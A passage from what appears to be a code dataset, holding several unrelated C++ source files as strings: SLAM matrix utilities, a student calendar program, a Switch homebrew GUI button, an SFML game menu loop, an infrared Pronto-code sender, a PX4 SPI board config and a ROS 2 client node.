endl;\n    }\n    else {\n        cout << data << endl;\n    }\n}\n",
    "/* *\r\n * Copyright Shichao Yang,2016, Carnegie Mellon University\r\n * Email: shichaoy@andrew.cmu.edu\r\n * The code comes from Cube SLAM <https://github.com/shichaoy/cube_slam>\r\n */\r\n\r\n#include \"detect_3d_cuboid/matrix_utils.h\"\r\n\r\n// std c\r\n#include <math.h>\r\n#include <stdio.h>\r\n#include <algorithm>\r\n\r\n#include <iostream>\r\n#include <fstream>\r\n#include <iostream>\r\n#include <string> \r\n#include <sstream>\r\n#include <ctime>\r\n\r\nusing namespace Eigen;\r\n\r\nEigen::MatrixXd toEigenMatrixXd(const cv::Mat &cvMat) \r\n{\r\n    Eigen::MatrixXd eigenMat;\r\n    eigenMat.resize(cvMat.rows, cvMat.cols);\r\n    for (int i=0; i<cvMat.rows; i++)\r\n        for (int j=0; j<cvMat.cols; j++)\r\n            eigenMat(i,j) = cvMat.at<float>(i,j);\r\n\r\n    return eigenMat;\r\n}\r\n\r\nEigen::MatrixXf toEigenMatrixXf(const cv::Mat &cvMat) \r\n{\r\n    Eigen::MatrixXf eigenMat;\r\n    eigenMat.resize(cvMat.rows, cvMat.cols);\r\n    for (int i=0; i<cvMat.rows; i++)\r\n        for (int j=0; j<cvMat.cols; j++)\r\n            eigenMat(i,j) = cvMat.at<float>(i,j);\r\n\r\n    return eigenMat;\r\n}\r\n\r\ntemplate <class T>\r\nEigen::Quaternion<T> zyx_euler_to_quat(const T &roll, const T &pitch, const T &yaw)\r\n{\r\n      T sy = sin(yaw*0.5);\r\n      T cy = cos(yaw*0.5);\r\n      T sp = sin(pitch*0.5);\r\n      T cp = cos(pitch*0.5);\r\n      T sr = sin(roll*0.5);\r\n      T cr = cos(roll*0.5);\r\n      T w = cr*cp*cy + sr*sp*sy;\r\n      T x = sr*cp*cy - cr*sp*sy;\r\n      T y = cr*sp*cy + sr*cp*sy;\r\n      T z = cr*cp*sy - sr*sp*cy;\r\n      return Eigen::Quaternion<T>(w,x,y,z);\r\n}\r\ntemplate Eigen::Quaterniond zyx_euler_to_quat<double>(const double&, const double&, const double&);\r\ntemplate Eigen::Quaternionf zyx_euler_to_quat<float>(const float&, const float&, const float&);\r\n\r\n\r\ntemplate <class T>\r\nvoid quat_to_euler_zyx(const Eigen::Quaternion<T>& q, T& roll, T& pitch, T& yaw)\r\n{\r\n      T qw = q.w();\r\n      T qx = q.x();\r\n      T qy = q.y();\r\n      T qz = q.z();\r\n      \r\n      roll = atan2(2*(qw*qx+qy*qz), 1-2*(qx*qx+qy*qy));\r\n      pitch = asin(2*(qw*qy-qz*qx));\r\n      yaw = atan2(2*(qw*qz+qx*qy), 1-2*(qy*qy+qz*qz));\r\n}\r\ntemplate void quat_to_euler_zyx<double>(const Eigen::Quaterniond&, double&, double&, double&);\r\ntemplate void quat_to_euler_zyx<float>(const Eigen::Quaternionf&, float&, float&, float&);\r\n\r\n\r\ntemplate <class T>\r\nvoid rot_to_euler_zyx(const Eigen::Matrix<T,3,3>& R, T& roll, T& pitch, T& yaw)\r\n{    \r\n    pitch = asin(-R(2,0));\r\n\r\n    if (abs(pitch - M_PI/2) < 1.0e-3) \r\n    {\r\n\troll = 0.0;\r\n\tyaw = atan2(R(1,2) - R(0,1), R(0,2) + R(1,1)) + roll;\r\n    }\r\n    else if (abs(pitch + M_PI/2) < 1.0e-3) \r\n    {\r\n\troll = 0.0;\r\n\tyaw = atan2(R(1,2) - R(0,1), R(0,2) + R(1,1)) - roll;\r\n    }\r\n    else \r\n    {\r\n\troll = atan2(R(2,1), R(2,2));\r\n\tyaw = atan2(R(1,0), R(0,0));\r\n    }\r\n}\r\ntemplate void rot_to_euler_zyx<double>(const Matrix3d&, double&, double&, double&);\r\ntemplate void rot_to_euler_zyx<float>(const Matrix3f&, float&, float&, float&);\r\n\r\ntemplate <class T>\r\nEigen::Matrix<T,3,3> euler_zyx_to_rot(const T& roll,const T& pitch,const T& yaw)\r\n{\r\n    T cp = cos(pitch);\r\n    T sp = sin(pitch);\r\n    T sr = sin(roll);\r\n    T cr = cos(roll);\r\n    T sy = sin(yaw);\r\n    T cy = cos(yaw);\r\n    \r\n    Eigen::Matrix<T,3,3> R;\r\n    R<< cp*cy, (sr*sp*cy)-(cr*sy), (cr*sp*cy)+(sr*sy),\r\n        cp*sy, (sr*sp*sy)+(cr*cy), (cr*sp*sy)-(sr*cy),\r\n\t-sp,    sr*cp,              cr * cp;\r\n    return R;\r\n}\r\ntemplate Matrix3d euler_zyx_to_rot<double>(const double&, const double&, const double&);\r\ntemplate Matrix3f euler_zyx_to_rot<float>(const float&, const float&, const float&);\r\n\r\n// BRIEF real_to_homo_coord()\r\ntemplate <class T>\r\nEigen::Matrix<T, Eigen::Dynamic, Eigen::Dynamic> real_to_homo_coord(const Eigen::Matrix<T, Eigen::Dynamic, Eigen::Dynamic>& pts_in)\r\n{\r\n  Eigen::Matrix<T, Eigen::Dynamic, Eigen::Dynamic> pts_homo_out;\r\n  int raw_rows = pts_in.rows();  \r\n  int raw_cols = pts_in.cols();\r\n\r\n  pts_homo_out.resize(raw_rows+1,raw_cols);\r\n  pts_homo_out << pts_in, Matrix<T,1,Dynamic>::Ones(raw_cols);\r\n  return pts_homo_out;\r\n}\r\ntemplate MatrixXd real_to_homo_coord<double>(const MatrixXd&);template MatrixXf real_to_homo_coord<float>(const MatrixXf&);\r\n\r\n\r\ntemplate <class T>\r\nvoid real_to_homo_coord(const Eigen::Matrix<T, Eigen::Dynamic, Eigen::Dynamic>& pts_in, Eigen::Matrix<T, Eigen::Dynamic, Eigen::Dynamic>& pts_homo_out)\r\n{\r\n  int raw_rows=pts_in.rows();  int raw_cols=pts_in.cols();\r\n  \r\n  pts_homo_out.resize(raw_rows+1,raw_cols);\r\n  pts_homo_out<<pts_in,\r\n\t        Matrix<T,1,Dynamic>::Ones(raw_cols); \r\n}\r\ntemplate void real_to_homo_coord<double>(const MatrixXd&,MatrixXd&);template void real_to_homo_coord<float>(const MatrixXf&,MatrixXf&);\r\n\r\n\r\ntemplate <class T>  // though vector can be casted into matrix, to make output clear to be vector, it is better to define a new function.\r\nEigen::Matrix<T, Eigen::Dynamic, 1> real_to_homo_coord_vec(const Eigen::Matrix<T, Eigen::Dynamic, 1>& pts_in)\r\n{\r\n  Eigen::Matrix<T, Eigen::Dynamic, 1> pts_homo_out;\r\n  int raw_rows=pts_in.rows();;\r\n  \r\n  pts_homo_out.resize(raw_rows+1);\r\n  pts",
    "/* \u4fe111 2351892 \u9648\u5955\u70ab */\r\n#include <iostream>\r\n#include <iomanip>\r\n#include<limits>\r\n \r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n\tint nian, yue, days = 0, day1;\r\n\tint i, j, k, n = 0;\r\n\twhile (1) {\r\n\t\tcout << \"\u8bf7\u8f93\u5165\u5e74\u4efd(2000-2030)\u548c\u6708\u4efd(1-12) :\";\r\n\t\tcin >> nian >> yue;\r\n\t\tif (cin.fail()) {\r\n\t\t\tcin.clear();//\u6e05\u9664\u8f93\u5165\u6d41\u7684\u9519\u8bef\u6807\u5fd7\uff0c\u4ee5\u4fbf\u7ee7\u7eed\u8bfb\u53d6\u8f93\u5165\u3002\r\n\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n');//\u5ffd\u7565\u8f93\u5165\u6d41\u4e2d\u76f4\u5230\u884c\u672b\u5c3e\u7684\u6240\u6709\u5185\u5bb9\uff0c\u5305\u62ec\u6362\u884c\u7b26('\\n')\uff0c\u4ee5\u786e\u4fdd\u8f93\u5165\u6d41\u88ab\u6e05\u7a7a\u5e76\u51c6\u5907\u63a5\u53d7\u65b0\u7684\u8f93\u5165\r\n\t\t\tcout << \"\u8f93\u5165\u975e\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\" << endl;\r\n\t\t}\r\n\t\telse {\r\n\r\n\t\t\tif ((nian >= 2000) && (nian <= 2030) && (yue >= 1) && (yue <= 12))\r\n\t\t\t\tbreak;\r\n\t\t\telse {\r\n\t\t\t\tcout << \"\u8f93\u5165\u975e\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\" << endl;\r\n\t\t\t\tcontinue;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\twhile (1) {\r\n\t\tcout << \"\u8bf7\u8f93\u5165\" << nian << \"\u5e74\" << yue << \"\u67081\u65e5\u7684\u661f\u671f(0 - 6\u8868\u793a\u661f\u671f\u65e5 - \u661f\u671f\u516d) :\";\r\n\t\tcin >> day1;\r\n\t\tif (cin.fail()) {\r\n\t\t\tcin.clear();\r\n\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n');\r\n\t\t\tcout << \"\u8f93\u5165\u975e\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\" << endl;\r\n\t\t}\r\n\t\telse {\r\n\r\n\t\t\tif (day1 >= 0 && day1 <= 6)\r\n\t\t\t\tbreak;\r\n\t\t\telse {\r\n\t\t\t\tcout << \"\u8f93\u5165\u975e\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\" << endl;\r\n\t\t\t\tcontinue;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tswitch (yue) {\r\n\t\tcase 1:\r\n\t\tcase 3:\r\n\t\tcase 5:\r\n\t\tcase 7:\r\n\t\tcase 8:\r\n\t\tcase 10:\r\n\t\tcase 12:\r\n\t\t\tdays = 31;\r\n\t\t\tbreak;\r\n\t\tcase 2:\r\n\t\t\tif (nian % 4 == 0 && nian % 100 != 0 || nian % 400 == 0) {\r\n\t\t\t\tdays = 29;\r\n\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\tdays = 28;\r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t\tcase 4:\r\n\t\tcase 6:\r\n\t\tcase 9:\r\n\t\tcase 11:\r\n\t\t\tdays = 30;\r\n\r\n\t}\r\n\r\n\tcout << endl;\r\n\tcout << nian << \"\u5e74\" << yue << \"\u6708\u7684\u6708\u5386\u4e3a:\" << endl;\r\n\tcout << \"\u661f\u671f\u65e5  \u661f\u671f\u4e00  \u661f\u671f\u4e8c  \u661f\u671f\u4e09  \u661f\u671f\u56db  \u661f\u671f\u4e94  \u661f\u671f\u516d\" << endl;\r\n\tfor (i = 0; i < day1; i++) {\r\n\t\tcout << \"        \";//8\u4e2a\u7a7a\u683c\r\n\t}\r\n\tfor (j = 1; j <= (7 - day1); j++) {\r\n\t\tcout << setiosflags(ios::right) << setw(4) << j << \"    \";\r\n\t}\r\n\tcout << endl;\r\n\tfor (k = (8 - day1); k <= days; k++) {\r\n\t\tcout << setiosflags(ios::right) << setw(4) << k << \"    \";\r\n\t\tn++;\r\n\t\tif (n % 7 == 0 && n != 0) {\r\n\t\t\tcout << endl;\r\n\t\t}\r\n\t}\r\n\t//if (days - 7 + day1) {\r\n\t//\t;\r\n\t//}\r\n\t//else {\r\n\t\tcout << endl;\r\n\t//}\r\n\r\n\r\n\t\r\n\t\treturn 0;\r\n}\r\n",
    "#include \"button.hpp\"\n#include \"gui.hpp\"\n\nextern \"C\" {\n#include \"theme.h\"\n}\n\nButton::Button() {\n    m_isActivated = false;\n    m_isSelected = false;\n}\n\nvoid Button::draw() {\n    // Offset calculation\n    s32 resultX = position.first - m_gui->m_targetOffsetX;\n    s32 resultY = position.second - m_gui->m_targetOffsetY;\n    if (resultX + volume.first < 0 || resultY + volume.second < 0 || resultX > SCREEN_WIDTH || resultY > SCREEN_HEIGHT)\n        return;\n    s32 borderX = resultX - 5;\n    s32 borderY = resultY - 5;\n    if (m_isSelected) {\n        m_gui->drawRectangled(borderX, borderY, volume.first + 10, volume.second + 10, m_isActivated ? currTheme.activatedColor : currTheme.highlightColor);\n        m_gui->drawShadow(borderX, borderY, volume.first + 10, volume.second + 10);\n    } else\n        m_gui->drawShadow(resultX, resultY, volume.first, volume.second);\n\n    m_gui->drawRectangled(resultX, resultY, volume.first, volume.second, currTheme.selectedButtonColor);\n\n    drawAction(m_gui, resultX, resultY, &m_isActivated);\n\n    if (!usableCondition())\n        m_gui->drawRectangled(resultX, resultY, volume.first, volume.second, m_gui->makeColor(0x80, 0x80, 0x80, 0x80));\n}\n\nbool Button::onInput(u32 kdown) {\n    if (!m_isSelected)\n        return false;\n\n    if (!m_isActivated) {\n        if ((kdown & HidNpadButton_A) && activatable) {\n            m_isActivated = true;\n            kdown = 0;\n        } else {\n            if (kdown & HidNpadButton_AnyUp) m_gui->selectButton(adjacentButton[0]);\n            if (kdown & HidNpadButton_AnyDown) m_gui->selectButton(adjacentButton[1]);\n            if (kdown & HidNpadButton_AnyLeft) m_gui->selectButton(adjacentButton[2]);\n            if (kdown & HidNpadButton_AnyRight) m_gui->selectButton(adjacentButton[3]);\n            if (kdown & (HidNpadButton_AnyUp | HidNpadButton_AnyDown | HidNpadButton_AnyLeft | HidNpadButton_AnyRight)) return true;\n        }\n    }\n\n    if (!usableCondition()) return false;\n\n    inputAction(kdown, &m_isActivated);\n\n    return false;\n}\n\nvoid Button::onTouch(HidTouchState &touch) {\n    if (!usableCondition()) return;\n\n    u16 resultX = position.first > m_gui->m_targetOffsetX ? position.first - m_gui->m_targetOffsetX : 0;\n    u16 resultY = position.second > m_gui->m_targetOffsetY ? position.second - m_gui->m_targetOffsetY : 0;\n\n    if (touch.x >= resultX && touch.x <= (resultX + volume.first) && touch.y >= resultY && touch.y <= (resultY + volume.second)) {\n        if (m_isSelected) {\n            if (activatable)\n                m_isActivated = true;\n            else\n                inputAction(HidNpadButton_A, &m_isActivated);\n            return;\n        }\n\n        m_gui->selectButtonByRef(this);\n    }\n}\n",
    "\ufeff#include <SFML/Audio.hpp>\n#include <SFML/Graphics.hpp>\n#include <iostream>\n#include <cstdlib>\n#include <cmath>\n#include <vector>\n#include <string>\n#include <fstream>\n#include <sstream>\n#include \"Menu.h\"\nusing namespace std;\nusing namespace sf;\n\nEvent event;\nbool sound = true;\nbool hard = false;\nbool new_user = false;\nbool replay_lvl1 = false, replay_lvl2 = false, replay_lvl3 = false, replay_lvl4 = false;\nint name_selected = 0;\nint num_of_users;\nint LEVEL_ALL_USERS[1000] = {};\nconst int MAX_PLAYERS = 5;\nint PageNumber = 1000; //default => 1000\nfloat volume = 1; // 100%\nstruct user {\n    int level;\n    string username;\n}Data[MAX_PLAYERS + 1];\n\nvoid read();\nvoid edit_data();\nvoid write();\nvoid intro(RenderWindow& window); //PageNumber => 0\nvoid playerName(RenderWindow& window, Sprite& background, Music& bg_music); //PageNumber => -4\nvoid loadGame(RenderWindow& window, Sprite& background, Music& bg_music); //PageNumber => -5\nvoid options(RenderWindow& window, Sprite& background, Music& bg_music); //PageNumber => -2\nvoid controls(RenderWindow& window, Sprite& background); //PageNumber => -8\nvoid loading(RenderWindow& window, int windowNum); //PageNumber => -3\nvoid gameWindow1(RenderWindow& window); //PageNumber => 1\nvoid gameWindow2(RenderWindow& window); //PageNumber => 2\nvoid gameWindow3(RenderWindow& window, Music foot[], Music& shoot, Music& jump, Music& punch, Music& hurt, Music& music_bg, Music& game_over_sound, Texture& fire_t, Sprite& health1, Sprite& health2, Sprite& health3, Sprite& slot, Sprite& Time, Text& TIME, Sprite& pyramid, int& TIME_Display, Texture& timer_T); //PageNumber => 3\nvoid gameWindow4(RenderWindow& window, Sprite& slot); //PageNumber => 4\nvoid gameWindow5(RenderWindow& window); //PageNumber => 5\nvoid winWindow(RenderWindow& window, int windowNum); //PageNumber => -7\nvoid gameOver(RenderWindow& window, int windowNum); //PageNumber => -6\nvoid pause(RenderWindow& window);\n\n\nint main() {\n\n    read();\n    RenderWindow window(VideoMode(1920, 1080), \"The Lost Relics\", Style::Fullscreen);\n    window.setFramerateLimit(60);\n    Menu menu(1920, 1080);\n    Image cursorImage;\n    cursorImage.loadFromFile(\"./assets/textures/mouseCross.png\");\n    Cursor mouseCross;\n    mouseCross.loadFromPixels(cursorImage.getPixelsPtr(), cursorImage.getSize(), { 0, 0 });\n    window.setMouseCursor(mouseCross);\n\n    Music bg_music;\n    bg_music.openFromFile(\"./assets/sounds/Ancient Egyptian Music.mp3\");\n    bg_music.setVolume(25 * volume);\n    bg_music.setLoop(true);\n\n    //menu background\n    Texture background_T;\n    background_T.loadFromFile(\"./assets/textures/Untitled965 (01).png\");\n    Sprite background;\n    background.setTexture(background_T);\n\n    //sounds\n    Music enter;\n    enter.openFromFile(\"./assets/sounds/enter.mp3\");\n    enter.setVolume(50);\n\n    Clock c;\n    float deltaTime = 0, timer = 0;\n    int B = 0, B2 = 0;\n\n    while (true) {\n        if (PageNumber == 1000) {\n            while (window.isOpen()) {\n                if (sound && (bg_music.getStatus() == Music::Stopped)) {\n                    bg_music.play();\n                }\n                c.restart();\n                while (window.pollEvent(event)) {\n                    if (event.type == Event::Closed) {\n                        window.close();\n                        break;\n                    }\n                    if (event.type == Event::KeyPressed) {\n                        if (event.key.code == Keyboard::Up) {\n                            menu.MoveUp();\n                        }\n                    }\n                    if (event.type == Event::KeyPressed) {\n                        if (event.key.code == Keyboard::Down) {\n                            menu.MoveDown();\n                        }\n                        if (event.key.code == Keyboard::Enter) {\n                            enter.play();\n                            if (menu.pressed() == 0) {\n                                PageNumber = -4;\n                            }\n                            else if (menu.pressed() == 1) {\n                                PageNumber = -5;\n                            }\n                            else if (menu.pressed() == 2) {\n                                PageNumber = -8;\n                            }\n                            else if (menu.pressed() == 3) {\n                                PageNumber = -2;\n                            }\n                            else if (menu.pressed() == 4) {\n                                PageNumber = -1;\n                            }\n                        }\n                    }\n                }\n                replay_lvl1 = false;\n                replay_lvl2 = false;\n                replay_lvl3 = false;\n                replay_lvl4 = false;\n\n                //mouse\n                if (menu.mouse.getGlobalBounds().intersects(menu.mainmenu[0].getGlobalBounds()) && Mouse::isButtonPressed(Mouse::Left)) {\n                    enter.play();\n                    PageNumber = -4;\n                }\n             ",
    "#define TEST 0\n\n#if TEST\n#\tdefine SEND_PRONTO        1\n#\tdefine PRONTO_ONCE        false\n#\tdefine PRONTO_REPEAT      true\n#\tdefine PRONTO_FALLBACK    true\n#\tdefine PRONTO_NOFALLBACK  false\n#endif\n\n#if SEND_PRONTO\n\n//******************************************************************************\n#if TEST\n#\tinclude <stdio.h>\n\tvoid  enableIROut (int freq)  { printf(\"\\nFreq = %d KHz\\n\", freq); }\n\tvoid  mark        (int t)     { printf(\"+%d,\" , t); }\n\tvoid  space       (int t)     { printf(\"-%d, \", t); }\n#else\n#\tinclude \"IRremote.h\"\n#endif // TEST\n\n//+=============================================================================\n// Check for a valid hex digit\n//\nbool  ishex (char ch)\n{\n\treturn ( ((ch >= '0') && (ch <= '9')) ||\n             ((ch >= 'A') && (ch <= 'F')) ||\n             ((ch >= 'a') && (ch <= 'f'))   ) ? true : false ;\n}\n\n//+=============================================================================\n// Check for a valid \"blank\" ... '\\0' is a valid \"blank\"\n//\nbool  isblank (char ch)\n{\n\treturn ((ch == ' ') || (ch == '\\t') || (ch == '\\0')) ? true : false ;\n}\n\n//+=============================================================================\n// Bypass spaces\n//\nbool  byp (char** pcp)\n{\n\twhile (isblank(**pcp))  (*pcp)++ ;\n}\n\n//+=============================================================================\n// Hex-to-Byte : Decode a hex digit\n// We assume the character has already been validated\n//\nuint8_t  htob (char ch)\n{\n\tif ((ch >= '0') && (ch <= '9'))  return ch - '0' ;\n\tif ((ch >= 'A') && (ch <= 'F'))  return ch - 'A' + 10 ;\n\tif ((ch >= 'a') && (ch <= 'f'))  return ch - 'a' + 10 ;\n}\n\n//+=============================================================================\n// Hex-to-Word : Decode a block of 4 hex digits\n// We assume the string has already been validated\n//   and the pointer being passed points at the start of a block of 4 hex digits\n//\nuint16_t  htow (char* cp)\n{\n\treturn ( (htob(cp[0]) << 12) | (htob(cp[1]) <<  8) |\n             (htob(cp[2]) <<  4) | (htob(cp[3])      )  ) ;\n}\n\n//+=============================================================================\n//\nbool sendPronto (char* s,  bool repeat,  bool fallback)\n{\n\tint       i;\n\tint       len;\n\tint       skip;\n\tchar*     cp;\n\tuint16_t  freq;  // Frequency in KHz\n\tuint8_t   usec;  // pronto uSec/tick\n\tuint8_t   once;\n\tuint8_t   rpt;\n\n\t// Validate the string\n\tfor (cp = s;  *cp;  cp += 4) {\n\t\tbyp(&cp);\n\t\tif ( !ishex(cp[0]) || !ishex(cp[1]) ||\n\t\t     !ishex(cp[2]) || !ishex(cp[3]) || !isblank(cp[4]) )  return false ;\n\t}\n\n\t// We will use cp to traverse the string\n\tcp = s;\n\n\t// Check mode = Oscillated/Learned\n\tbyp(&cp);\n\tif (htow(cp) != 0000)  return false;\n\tcp += 4;\n\n\t// Extract & set frequency\n\tbyp(&cp);\n\tfreq = (int)(1000000 / (htow(cp) * 0.241246));  // Rounding errors will occur, tolerance is +/- 10%\n\tusec = (int)(((1.0 / freq) * 1000000) + 0.5);  // Another rounding error, thank Cod for analogue electronics\n\tfreq /= 1000;  // This will introduce a(nother) rounding error which we do not want in the usec calcualtion\n\tcp += 4;\n\n\t// Get length of \"once\" code\n\tbyp(&cp);\n\tonce = htow(cp);\n\tcp += 4;\n\n\t// Get length of \"repeat\" code\n\tbyp(&cp);\n\trpt = htow(cp);\n\tcp += 4;\n\n\t// Which code are we sending?\n\tif (fallback) { // fallback on the \"other\" code if \"this\" code is not present\n\t\tif (!repeat) { // requested 'once'\n\t\t\tif (once)  len = once * 2,  skip = 0 ;  // if once exists send it\n\t\t\telse       len = rpt  * 2,  skip = 0 ;  // else send repeat code\n\t\t} else { // requested 'repeat'\n\t\t\tif (rpt)   len = rpt  * 2,  skip = 0 ;  // if rpt exists send it\n\t\t\telse       len = once * 2,  skip = 0 ;  // else send once code\n\t\t}\n\t} else {  // Send what we asked for, do not fallback if the code is empty!\n\t\tif (!repeat)  len = once * 2,  skip = 0 ;     // 'once' starts at 0\n\t\telse          len = rpt  * 2,  skip = once ;  // 'repeat' starts where 'once' ends\n    }\n\n\t// Skip to start of code\n\tfor (i = 0;  i < skip;  i++, cp += 4)  byp(&cp) ;\n\n\t// Send code\n\tenableIROut(freq);\n\tfor (i = 0;  i < len;  i++) {\n\t\tbyp(&cp);\n\t\tif (i & 1)  space(htow(cp) * usec);\n\t\telse        mark (htow(cp) * usec);\n\t\tcp += 4;\n\t}\n}\n\n//+=============================================================================\n#if TEST\n\nint  main ( )\n{\n\tchar  prontoTest[] =\n\t\t\"0000 0070 0000 0032 0080 0040 0010 0010 0010 0030 \" //  10\n\t\t\"0010 0010 0010 0010 0010 0010 0010 0010 0010 0010 \" //  20\n\t\t\"0010 0010 0010 0010 0010 0010 0010 0010 0010 0010 \" //  30\n\t\t\"0010 0010 0010 0030 0010 0010 0010 0010 0010 0010 \" //  40\n\t\t\"0010 0010 0010 0010 0010 0010 0010 0010 0010 0010 \" //  50\n\t\t\"0010 0010 0010 0030 0010 0010 0010 0010 0010 0010 \" //  60\n\t\t\"0010 0010 0010 0010 0010 0010 0010 0010 0010 0010 \" //  70\n\t\t\"0010 0010 0010 0030 0010 0010 0010 0030 0010 0010 \" //  80\n\t\t\"0010 0010 0010 0030 0010 0010 0010 0010 0010 0030 \" //  90\n\t\t\"0010 0010 0010 0030 0010 0010 0010 0010 0010 0030 \" // 100\n\t\t\"0010 0030 0010 0aa6\";                               // 104\n\n\tsendPronto(prontoTest, PRONTO_ONCE,   PRONTO_FALLBACK);    /",
    "/****************************************************************************\n *\n *   Copyright (C) 2020 PX4 Development Team. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n *\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *    notice, this list of conditions and the following disclaimer in\n *    the documentation and/or other materials provided with the\n *    distribution.\n * 3. Neither the name PX4 nor the names of its contributors may be\n *    used to endorse or promote products derived from this software\n *    without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n * \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n * FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n * COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS\n * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED\n * AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n * ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n * POSSIBILITY OF SUCH DAMAGE.\n *\n ****************************************************************************/\n\n#include <px4_platform_common/px4_config.h>\n#include <px4_platform/gpio.h>\n\n#include <stdint.h>\n#include <stdbool.h>\n#include <debug.h>\n#include <unistd.h>\n\n#include <nuttx/spi/spi.h>\n#include <arch/board/board.h>\n#include <systemlib/px4_macros.h>\n#include <nuttx/mmcsd.h>\n\n#include <arm_internal.h>\n#include <chip.h>\n#include <stm32_gpio.h>\n#include \"board_config.h\"\n\n#include <px4_arch/spi_hw_description.h>\n#include <drivers/drv_sensor.h>\n#include <nuttx/spi/spi.h>\n\nconstexpr px4_spi_bus_t px4_spi_buses[SPI_BUS_MAX_BUS_ITEMS] = {\n\tinitSPIBus(SPI::Bus::SPI1, {\n\t\tinitSPIDevice(SPIDEV_MMCSD(0), SPI::CS{GPIO::PortC, GPIO::Pin12}),\n\t\tinitSPIDevice(DRV_FLOW_DEVTYPE_PMW3901, SPI::CS{GPIO::PortB, GPIO::Pin4}),\n\t\tinitSPIDevice(DRV_DEVTYPE_UNUSED, SPI::CS{GPIO::PortB, GPIO::Pin5}),\n\t}),\n};\n\nstatic constexpr bool unused = validateSPIConfig(px4_spi_buses);\n\n/************************************************************************************\n * Name: stm32_spi_bus_initialize\n *\n * Description:\n *   Called to configure SPI buses on PX4FMU board.\n *\n ************************************************************************************/\nstatic struct spi_dev_s *spi_expansion;\n\n__EXPORT int stm32_spi_bus_initialize(void)\n{\n\t/* Configure SPI-based devices */\n\n\t/* Get the external SPI port */\n\tspi_expansion = stm32_spibus_initialize(1);\n\n\tif (!spi_expansion) {\n\t\tsyslog(LOG_ERR, \"[boot] FAILED to initialize SPI port %d\\n\", 1);\n\t\treturn -ENODEV;\n\t}\n\n#ifdef CONFIG_MMCSD\n\tint ret = mmcsd_spislotinitialize(CONFIG_NSH_MMCSDMINOR, CONFIG_NSH_MMCSDSLOTNO, spi_expansion);\n\n\tif (ret != OK) {\n\t\tsyslog(LOG_ERR, \"[boot] FAILED to bind SPI port 1 to the MMCSD driver\\n\");\n\t\treturn -ENODEV;\n\t}\n\n#endif\n\n\treturn OK;\n}\n",
    "#include <rclcpp/rclcpp.hpp>\n#include <myworkcell_core/srv/localize_part.hpp>\nclass ScanNPlan : public rclcpp::Node\n{\npublic:\n    ScanNPlan() : Node(\"scan_n_plan\")\n    {\n        vision_client_ = this->create_client<myworkcell_core::srv::LocalizePart>(\"localize_part\");\n\n        this->declare_parameter(\"base_frame\", \"world\");\n        this->declare_parameter(\"human_frame\", \"human\");\n    }\n\n    void start(const std::string &base_frame, const std::string& human_frame)\n    {\n        RCLCPP_INFO(get_logger(), \"Attempting to localize part\");\n\n\n        // Wait for service to be available\n        if (!vision_client_->wait_for_service(std::chrono::seconds(5)))\n        {\n            RCLCPP_ERROR(get_logger(), \"Unable to find localize_part service. Start vision_node first.\");\n            return;\n        }\n\n        // Create a request for the LocalizePart service call\n        auto request = std::make_shared<myworkcell_core::srv::LocalizePart::Request>();\n        \n        request->base_frame = base_frame;\n        RCLCPP_INFO_STREAM(get_logger(), \"Requesting pose in base frame: \" << base_frame);\n        RCLCPP_INFO_STREAM(get_logger(), \"Note: we also have the human frame: \" << human_frame);\n\n        auto future = vision_client_->async_send_request(request);\n\n        if (rclcpp::spin_until_future_complete(this->get_node_base_interface(), future) != rclcpp::FutureReturnCode::SUCCESS)\n        {\n            RCLCPP_ERROR(this->get_logger(), \"Failed to receive LocalizePart service response\");\n            return;\n        }\n\n        auto response = future.get();\n        if (!response->success)\n        {\n            RCLCPP_ERROR(this->get_logger(), \"LocalizePart service failed\");\n            return;\n        }\n\n        RCLCPP_INFO(this->get_logger(), \"Part Localized: x: %f, y: %f, z: %f\",\n                    response->pose.position.x,\n                    response->pose.position.y,\n                    response->pose.position.z);\n    }\n\nprivate:\n    // Planning components\n    rclcpp::Client<myworkcell_core::srv::LocalizePart>::SharedPtr vision_client_;\n};\n\nint main(int argc, char **argv)\n{\n    // This must be called before anything else ROS-related\n    rclcpp::init(argc, argv);\n\n    // Create the ScanNPlan node\n    auto app = std::make_shared<ScanNPlan>();\n\n    std::string base_frame = app->get_parameter(\"base_frame\").as_string();\n    std::string human_frame = app->get_parameter(\"human_frame\").as_string();\n\n    // Wait for the vision node to receive data\n    rclcpp::sleep_for(std::chrono::seconds(2));\n\n    app->start(base_frame, human_frame);\n\n    rclcpp::shutdown();\n    return 0;\n}",
